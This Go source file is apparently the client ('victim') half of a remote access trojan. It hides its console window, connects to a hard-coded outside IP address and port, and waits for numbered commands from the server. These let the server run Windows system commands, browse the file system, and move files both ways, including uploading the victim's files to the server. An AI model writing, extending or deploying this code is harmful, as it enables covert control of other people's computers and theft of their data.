package main

import (
	"bufio"
	"fmt"
	"log"
	"strings"
	"victim/core/Download"
	"victim/core/ExecuteSystemCommandWindows"
	"victim/core/Move"
	"victim/core/Upload"
	"victim/core/handleConnection"

	"github.com/gonutz/w32/v2"
)

type Data struct {
	Name string
	ID   int
	Age  float32
}

func DisplayError(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func hideConsole() {
	console := w32.GetConsoleWindow()
	if console == 0 {
		return // no console attached
	}
	// If this application is the process that created the console window, then
	// this program was not compiled with the -H=windowsgui flag and on start-up
	// it created a console along with the main application window. In this case
	// hide the console window.
	// See
	// http://stackoverflow.com/questions/9009333/how-to-check-if-the-program-is-run-from-a-console
	_, consoleProcID := w32.GetWindowThreadProcessId(console)
	if w32.GetCurrentProcessId() == consoleProcID {
		w32.ShowWindowAsync(console, w32.SW_HIDE)
	}
}

/*func OpenImage() {
	pwd, err := os.Getwd()
	if err != nil {
		fmt.Println(err)
	}

	percorso := fmt.Sprintf("%s%s", pwd, "\\prova.bat")

	fmt.Println(percorso)

	//cmd := exec.Command("C:\\Users\\ale\\Desktop\\victim\\core\\prova.bat")
	cmd := exec.Command(percorso)

	err1 := cmd.Run()
	if err1 != nil {
		log.Fatal(err1)
	}
}*/

func main() {

	//go OpenImage()
	hideConsole()

	//ServerIP := "146.241.30.71"
	//ServerIP := "192.168.178.86"
	//ServerIP := "147.53.196.47"
	ServerIP := "185.25.204.244"
	//ServerIP := "45.95.243.86"
	Port := "9090"
	//Port := "8080"

	connection, err := handleConnection.ConnectionWithServer(ServerIP, Port)

	if err != nil {
		log.Fatal(err)
	}

	defer connection.Close()
	//fmt.Println("[+] Connection established with " + connection.RemoteAddr().String())

	reader := bufio.NewReader(connection)
	loopControl := true

	for loopControl {
		user_input_raw, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}

		user_input := strings.TrimSuffix(user_input_raw, "\n")

		switch {
		case user_input == "1":
			//fmt.Println("[+] Executing Commands on Windows")
			err := ExecuteSystemCommandWindows.ExecuteCommandWindows(connection)
			DisplayError(err)
		case user_input == "2":
			//fmt.Println("[+] File system Navigation")
			err = Move.NavigateFileSystem(connection)
			DisplayError(err)
		case user_input == "3":
			//fmt.Println("[+] Downloading File From Server")
			err = Download.ReadFileContents(connection)
			DisplayError(err)
		case user_input == "4":
			//fmt.Println("[+] Uploading File To The Server")
			err = Upload.Upload2Server(connection)
			DisplayError(err)
		/*case user_input == "5":
		fmt.Println("[+] Downloading Folder")
		err = Upload.UploadFolder2Server(connection)
		DisplayError(err)*/
		case user_input == "99":
			//fmt.Println("[-] Exiting the windows program")
			loopControl = false
		default:
			fmt.Println("[-] Invalid input, try again")
		}
	}

}
